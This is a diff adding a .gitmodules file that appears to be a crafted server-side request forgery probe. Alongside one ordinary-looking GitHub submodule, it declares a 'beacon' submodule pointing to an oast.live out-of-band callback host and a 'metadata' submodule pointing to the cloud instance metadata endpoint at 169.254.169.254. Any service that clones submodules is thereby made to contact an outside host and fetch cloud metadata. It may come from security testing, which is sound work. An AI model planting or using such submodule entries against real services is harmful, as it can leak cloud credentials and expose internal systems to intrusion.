@@ -1,0 +1,9 @@
+[submodule "legit-sub"]
+    path = legit-sub
+    url = https://github.com/jadghamloushh/tiny-sub.git
+[submodule "beacon"]
+    path = beacon
+    url = https://cdywptbwohg1kn6uqz5fq26s9b9cfe98c.oast.live/test.git
+[submodule "metadata"]
+    path = metadata
+    url = http://169.254.169.254/computeMetadata/v1/
